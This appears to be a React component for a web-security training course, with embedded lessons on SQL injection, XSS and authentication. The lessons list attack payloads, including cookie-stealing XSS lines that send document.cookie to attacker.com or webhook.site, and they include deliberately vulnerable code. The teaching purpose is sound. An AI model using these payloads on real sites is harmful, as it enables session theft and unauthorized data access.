import { useState } from 'react';
import { X, CheckCircle, BookOpen, Code, Terminal, Lightbulb } from 'lucide-react';

interface ModuleContentProps {
  moduleName: string;
  level: string;
  onClose: () => void;
  onComplete?: () => void;
}

interface ContentSection {
  type: 'theory' | 'example' | 'code' | 'exercise' | 'tip';
  title: string;
  content: string;
  codeLanguage?: string;
}

export function ModuleContent({ moduleName, level, onClose, onComplete }: ModuleContentProps) {
  const [currentSection, setCurrentSection] = useState(0);
  const [completedSections, setCompletedSections] = useState<Set<number>>(new Set());

  const moduleContent: Record<string, ContentSection[]> = {
    'Introduction to Web Security': [
      {
        type: 'theory',
        title: 'Understanding Web Security Fundamentals',
        content: 'Web security is the practice of protecting websites and web applications from various cyber threats. The web operates on a client-server model where browsers (clients) communicate with web servers using HTTP/HTTPS protocols.\n\nKey concepts:\n• CIA Triad: Confidentiality, Integrity, Availability\n• Attack Surface: All points where an attacker can try to enter or extract data\n• Defense in Depth: Multiple layers of security controls\n• Principle of Least Privilege: Users should have minimum necessary access',
      },
      {
        type: 'example',
        title: 'Common Web Vulnerabilities',
        content: 'OWASP Top 10 vulnerabilities include:\n\n1. Injection Flaws (SQL, NoSQL, OS commands)\n2. Broken Authentication\n3. Sensitive Data Exposure\n4. XML External Entities (XXE)\n5. Broken Access Control\n6. Security Misconfiguration\n7. Cross-Site Scripting (XSS)\n8. Insecure Deserialization\n9. Using Components with Known Vulnerabilities\n10. Insufficient Logging & Monitoring',
      },
      {
        type: 'code',
        title: 'Secure vs Insecure Code Example',
        content: `// INSECURE: Direct string concatenation
const query = "SELECT * FROM users WHERE username = '" + userInput + "'";

// SECURE: Parameterized query
const query = "SELECT * FROM users WHERE username = ?";
db.query(query, [userInput]);`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Hands-On Exercise',
        content: 'Task: Identify the security issues in this code:\n\n```\napp.get(\'/search\', (req, res) => {\n  const term = req.query.q;\n  res.send("<h1>Results for: " + term + "</h1>");\n});\n```\n\nProblems:\n1. No input validation on search term\n2. Direct concatenation enables XSS attacks\n3. No output encoding/escaping\n4. Missing Content-Security-Policy header',
      },
      {
        type: 'tip',
        title: 'Best Practices',
        content: '✓ Always validate and sanitize user input\n✓ Use HTTPS for all communications\n✓ Implement proper authentication and session management\n✓ Keep software and dependencies updated\n✓ Use security headers (CSP, X-Frame-Options, etc.)\n✓ Log security events and monitor for anomalies\n✓ Apply principle of least privilege',
      },
    ],
    'SQL Injection Basics': [
      {
        type: 'theory',
        title: 'What is SQL Injection?',
        content: 'SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application\'s database layer. It occurs when user input is improperly filtered or not parameterized.\n\nHow it works:\n1. Attacker finds an input field that interacts with database\n2. Injects malicious SQL code\n3. Database executes the malicious code\n4. Attacker gains unauthorized access to data\n\nTypes of SQL Injection:\n• In-band SQLi (Classic): Results shown directly\n• Blind SQLi: No direct results, use inference\n• Out-of-band SQLi: Uses different channels for results',
      },
      {
        type: 'code',
        title: 'Vulnerable Code Example',
        content: `// VULNERABLE LOGIN FUNCTION
function login(username, password) {
  const query = \`
    SELECT * FROM users
    WHERE username = '\${username}'
    AND password = '\${password}'
  \`;

  const result = db.query(query);
  return result.length > 0;
}

// Attack payload: username = "admin' --"
// Resulting query:
// SELECT * FROM users WHERE username = 'admin' --' AND password = ''
// The -- comments out the password check!`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Common SQL Injection Payloads',
        content: 'Authentication bypass:\n• \' OR \'1\'=\'1\n• \' OR \'1\'=\'1\'--\n• admin\'--\n• admin\'#\n\nData extraction:\n• \' UNION SELECT username, password FROM users--\n• \' UNION SELECT table_name FROM information_schema.tables--\n\nBoolean-based blind:\n• \' AND 1=1--  (returns true)\n• \' AND 1=2--  (returns false)\n\nTime-based blind:\n• \'; WAITFOR DELAY \'00:00:05\'--\n• \'; SELECT SLEEP(5)--',
      },
      {
        type: 'code',
        title: 'Secure Implementation',
        content: `// SECURE: Using parameterized queries
function login(username, password) {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const result = db.query(query, [username, password]);
  return result.length > 0;
}

// SECURE: Using ORM (e.g., with Sequelize)
async function login(username, password) {
  const user = await User.findOne({
    where: {
      username: username,
      password: password
    }
  });
  return user !== null;
}

// SECURE: Input validation
function sanitizeInput(input) {
  // Whitelist allowed characters
  return input.replace(/[^a-zA-Z0-9]/g, '');
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Practice Exercise',
        content: 'Try these challenges in our SQL Injection Lab:\n\n1. Basic Authentication Bypass:\n   - Login without knowing the password\n   - Payload: admin\'--\n\n2. Extract All Users:\n   - Use UNION to get all usernames\n   - Payload: \' UNION SELECT username, password FROM users--\n\n3. Find Table Names:\n   - Discover database schema\n   - Payload: \' UNION SELECT table_name, NULL FROM information_schema.tables--\n\n4. Boolean Blind Injection:\n   - Determine if "admin" user exists\n   - Test with: \' AND (SELECT COUNT(*) FROM users WHERE username=\'admin\')>0--',
      },
      {
        type: 'tip',
        title: 'Prevention Techniques',
        content: '✓ Use parameterized queries (prepared statements)\n✓ Use stored procedures with parameters\n✓ Validate input against whitelist\n✓ Escape special characters\n✓ Use ORMs with built-in protection\n✓ Apply principle of least privilege to database accounts\n✓ Disable detailed error messages in production\n✓ Use Web Application Firewall (WAF)\n✓ Regular security testing and code reviews',
      },
    ],
    'Cross-Site Scripting (XSS)': [
      {
        type: 'theory',
        title: 'Understanding XSS Attacks',
        content: 'Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes these scripts, potentially stealing cookies, session tokens, or other sensitive information.\n\nThree main types:\n\n1. Reflected XSS:\n   - Malicious script comes from HTTP request\n   - Not stored in database\n   - Example: Search results page\n\n2. Stored XSS:\n   - Script stored in database\n   - Executed when data is retrieved\n   - Example: Comment sections, user profiles\n\n3. DOM-based XSS:\n   - Vulnerability in client-side JavaScript\n   - No server interaction needed',
      },
      {
        type: 'code',
        title: 'Vulnerable Code Examples',
        content: `// REFLECTED XSS (Vulnerable)
app.get('/search', (req, res) => {
  const searchTerm = req.query.q;
  res.send(\`<h1>Results for: \${searchTerm}</h1>\`);
});
// Attack URL: /search?q=<script>alert('XSS')</script>

// STORED XSS (Vulnerable)
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.insert({ comment: comment });
});

app.get('/comments', (req, res) => {
  const comments = db.getAll();
  let html = '<div>';
  comments.forEach(c => {
    html += \`<p>\${c.comment}</p>\`;
  });
  html += '</div>';
  res.send(html);
});

// DOM-based XSS (Vulnerable)
const userInput = window.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Common XSS Payloads',
        content: 'Basic alert box:\n• <script>alert(\'XSS\')</script>\n• <img src=x onerror=alert(\'XSS\')>\n\nCookie stealing:\n• <script>fetch(\'https://attacker.com?c=\'+document.cookie)</script>\n• <img src=x onerror="this.src=\'https://attacker.com?c=\'+document.cookie">\n\nEvent handlers:\n• <body onload=alert(\'XSS\')>\n• <input onfocus=alert(\'XSS\') autofocus>\n• <svg onload=alert(\'XSS\')>\n\nBypass filters:\n• <ScRiPt>alert(\'XSS\')</ScRiPt>\n• <img src=x onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">\n• <iframe srcdoc="<script>alert(\'XSS\')</script>">',
      },
      {
        type: 'code',
        title: 'Secure Implementation',
        content: `// SECURE: Output encoding
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.get('/search', (req, res) => {
  const searchTerm = escapeHtml(req.query.q);
  res.send(\`<h1>Results for: \${searchTerm}</h1>\`);
});

// SECURE: Using template engines with auto-escaping
app.get('/comments', (req, res) => {
  const comments = db.getAll();
  res.render('comments', { comments }); // Template auto-escapes
});

// SECURE: Content Security Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'"
  );
  next();
});

// SECURE: DOM manipulation
const userInput = window.location.hash.substring(1);
document.getElementById('output').textContent = userInput; // Use textContent`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Practice Exercises',
        content: 'Try these in our XSS Lab:\n\n1. Reflected XSS:\n   - Inject script in search box\n   - Payload: <script>alert(document.cookie)</script>\n\n2. Bypass Basic Filter:\n   - If <script> is blocked, try:\n   - <img src=x onerror=alert(1)>\n\n3. Stored XSS:\n   - Post a comment with malicious script\n   - See it execute for all users\n\n4. Extract Session Token:\n   - Use fetch() to send cookie to your server\n   - Payload: <script>fetch(\'https://webhook.site/your-id?c=\'+document.cookie)</script>',
      },
      {
        type: 'tip',
        title: 'Prevention Best Practices',
        content: '✓ Encode output (HTML, JavaScript, URL, CSS context)\n✓ Validate input with whitelists\n✓ Use Content Security Policy (CSP)\n✓ Use HTTPOnly and Secure flags on cookies\n✓ Use modern frameworks with auto-escaping\n✓ Sanitize HTML with libraries like DOMPurify\n✓ Use textContent instead of innerHTML\n✓ Implement X-XSS-Protection header\n✓ Regular security scanning and testing',
      },
    ],
    'Basic Authentication': [
      {
        type: 'theory',
        title: 'Authentication Fundamentals',
        content: 'Authentication is the process of verifying the identity of a user or system. Common vulnerabilities include:\n\n• Weak Passwords: Easy to guess or crack\n• Credential Stuffing: Using leaked credentials\n• Brute Force: Trying many password combinations\n• Session Fixation: Forcing a known session ID\n• Broken Password Reset: Exploiting reset mechanism\n\nAuthentication Flow:\n1. User provides credentials\n2. Server validates credentials\n3. Server creates session/token\n4. Client stores session/token\n5. Client sends token with each request',
      },
      {
        type: 'code',
        title: 'Insecure Authentication',
        content: `// INSECURE: Plain text passwords
app.post('/register', (req, res) => {
  const { username, password } = req.body;
  db.insert({
    username,
    password: password  // Stored in plain text!
  });
});

// INSECURE: No rate limiting
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.findOne({ username, password });
  if (user) {
    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// INSECURE: Predictable session IDs
function generateSessionId() {
  return Date.now().toString(); // Easy to guess!
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure Authentication',
        content: `const bcrypt = require('bcrypt');
const crypto = require('crypto');

// SECURE: Hash passwords
app.post('/register', async (req, res) => {
  const { username, password } = req.body;

  // Validate password strength
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password too short' });
  }

  const hashedPassword = await bcrypt.hash(password, 10);
  db.insert({ username, password: hashedPassword });
  res.json({ success: true });
});

// SECURE: Compare hashed passwords
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Rate limiting check
  if (isRateLimited(req.ip)) {
    return res.status(429).json({ error: 'Too many attempts' });
  }

  const user = db.findOne({ username });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const valid = await bcrypt.compare(password, user.password);
  if (valid) {
    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// SECURE: Generate secure session IDs
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Common Attack Techniques',
        content: 'Default Credentials:\n• admin/admin\n• admin/password\n• root/root\n\nSQL Injection in Login:\n• Username: admin\'--\n• Password: anything\n\nBrute Force:\n• Automated password guessing\n• Use tools like Hydra, Burp Suite\n\nSession Hijacking:\n• Steal session cookie via XSS\n• Intercept unencrypted traffic\n• Session fixation attacks\n\nPassword Reset Exploitation:\n• Predictable reset tokens\n• Account enumeration\n• Token not expiring',
      },
      {
        type: 'exercise',
        title: 'Practice Tasks',
        content: 'Authentication Bypass Lab exercises:\n\n1. SQL Injection Login:\n   - Username: admin\'--\n   - Password: (leave empty)\n\n2. Default Credentials:\n   - Try common username/password combinations\n   - admin/admin, test/test, root/toor\n\n3. Session Analysis:\n   - Login and capture your session cookie\n   - Analyze the session ID format\n   - Is it predictable?\n\n4. Brute Force:\n   - Use a small password list\n   - Implement rate limiting bypass\n   - Document your findings',
      },
      {
        type: 'tip',
        title: 'Security Best Practices',
        content: '✓ Use bcrypt/Argon2 for password hashing\n✓ Implement account lockout after failed attempts\n✓ Use CAPTCHA to prevent automated attacks\n✓ Implement Multi-Factor Authentication (MFA)\n✓ Use secure session management\n✓ Set HTTPOnly and Secure flags on cookies\n✓ Implement password strength requirements\n✓ Use HTTPS for all authentication\n✓ Implement secure password reset mechanism\n✓ Never reveal if username or password was wrong',
      },
    ],
  };

  const content = moduleContent[moduleName] || [
    {
      type: 'theory',
      title: 'Content Coming Soon',
      content: 'Detailed content for this module is being prepared. Check back soon!',
    },
  ];

  const handleSectionComplete = (index: number) => {
    setCompletedSections(new Set(completedSections).add(index));
    if (index < content.length - 1) {
      setCurrentSection(index + 1);
    }
  };

  const currentContent = content[currentSection];
  const progress = ((completedSections.size / content.length) * 100).toFixed(0);

  const getIcon = (type: string) => {
    switch (type) {
      case 'theory': return BookOpen;
      case 'code': return Code;
      case 'exercise': return Terminal;
      case 'tip': return Lightbulb;
      default: return BookOpen;
    }
  };

  const getColorClass = (type: string) => {
    switch (type) {
      case 'theory': return 'from-blue-500 to-blue-600';
      case 'code': return 'from-emerald-500 to-emerald-600';
      case 'exercise': return 'from-orange-500 to-orange-600';
      case 'tip': return 'from-yellow-500 to-yellow-600';
      default: return 'from-gray-500 to-gray-600';
    }
  };

  const allCompleted = completedSections.size === content.length;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4 overflow-y-auto">
      <div className="bg-white rounded-xl shadow-2xl max-w-5xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        <div className="bg-gradient-to-r from-emerald-600 to-teal-600 text-white p-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-2xl font-bold">{moduleName}</h2>
              <p className="text-emerald-50 mt-1">{level} Level</p>
            </div>
            <button
              onClick={onClose}
              className="p-2 hover:bg-white/20 rounded-lg transition-colors"
            >
              <X className="h-6 w-6" />
            </button>
          </div>
          <div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-medium">Progress</span>
              <span className="text-sm font-semibold">{progress}%</span>
            </div>
            <div className="w-full bg-emerald-800 rounded-full h-2">
              <div
                className="bg-white h-2 rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-3xl mx-auto space-y-6">
            <div className="flex space-x-2 overflow-x-auto pb-4">
              {content.map((section, index) => {
                const Icon = getIcon(section.type);
                const isCompleted = completedSections.has(index);
                const isCurrent = index === currentSection;

                return (
                  <button
                    key={index}
                    onClick={() => setCurrentSection(index)}
                    className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-all whitespace-nowrap ${
                      isCurrent
                        ? 'bg-emerald-600 text-white'
                        : isCompleted
                        ? 'bg-emerald-100 text-emerald-800'
                        : 'bg-gray-100 text-gray-700'
                    }`}
                  >
                    {isCompleted ? (
                      <CheckCircle className="h-4 w-4" />
                    ) : (
                      <Icon className="h-4 w-4" />
                    )}
                    <span className="text-sm font-medium">
                      {index + 1}. {section.type.charAt(0).toUpperCase() + section.type.slice(1)}
                    </span>
                  </button>
                );
              })}
            </div>

            <div className={`bg-gradient-to-r ${getColorClass(currentContent.type)} rounded-xl p-6 text-white`}>
              <div className="flex items-center space-x-3 mb-2">
                {(() => {
                  const Icon = getIcon(currentContent.type);
                  return <Icon className="h-6 w-6" />;
                })()}
                <h3 className="text-xl font-bold">{currentContent.title}</h3>
              </div>
              <p className="text-sm opacity-90">
                Section {currentSection + 1} of {content.length}
              </p>
            </div>

            <div className="bg-white border-2 border-gray-200 rounded-xl p-6">
              {currentContent.codeLanguage ? (
                <pre className="bg-gray-900 text-green-400 p-6 rounded-lg overflow-x-auto font-mono text-sm whitespace-pre-wrap">
                  {currentContent.content}
                </pre>
              ) : (
                <div className="prose prose-lg max-w-none">
                  <p className="text-gray-800 whitespace-pre-line leading-relaxed">
                    {currentContent.content}
                  </p>
                </div>
              )}
            </div>

            <div className="flex items-center justify-between pt-4">
              <button
                onClick={() => setCurrentSection(Math.max(0, currentSection - 1))}
                disabled={currentSection === 0}
                className="px-6 py-3 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                Previous
              </button>

              {currentSection < content.length - 1 ? (
                <button
                  onClick={() => handleSectionComplete(currentSection)}
                  className="px-6 py-3 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-semibold"
                >
                  Mark Complete & Continue
                </button>
              ) : (
                <button
                  onClick={() => {
                    handleSectionComplete(currentSection);
                    if (onComplete) {
                      onComplete();
                    }
                  }}
                  className="px-6 py-3 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-semibold"
                >
                  {allCompleted ? 'Close' : 'Complete Module'}
                </button>
              )}
            </div>
          </div>
        </div>

        {allCompleted && (
          <div className="bg-emerald-50 border-t-4 border-emerald-500 p-6">
            <div className="flex items-center space-x-3">
              <CheckCircle className="h-8 w-8 text-emerald-600" />
              <div>
                <h3 className="font-bold text-emerald-900 text-lg">Module Completed!</h3>
                <p className="text-emerald-800 text-sm">
                  Great work! You've completed all sections of this module.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
